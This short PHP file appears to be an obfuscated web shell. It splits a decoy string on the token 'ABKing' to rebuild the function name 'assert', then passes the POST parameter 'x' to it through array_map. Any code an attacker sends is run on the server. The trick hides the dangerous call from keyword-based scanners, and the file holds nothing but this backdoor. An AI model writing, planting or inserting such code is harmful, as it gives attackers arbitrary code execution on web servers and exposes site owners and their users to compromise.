<?php
function argu($a, $b){
    $ext = explode('ABKing',$a);
    $ext1 = $ext[0];
    $ext2 = $ext[1];
    $ext3 = $ext[2];
    $ext4 = $ext[3];
    $ext5 = $ext[4];
    $ext6 = $ext[5];
    $arr[0] = $ext1.$ext2.$ext3.$ext4.$ext5.$ext6;
    $arr[1] = $b;
    return $arr;
}
$b = $_POST['x'];
$arr = argu("aABKingsABKingsABKingeABKingrABKingt", $b);
$x = $arr[0];
$y = $arr[1];
array_map($x, array($y));
?>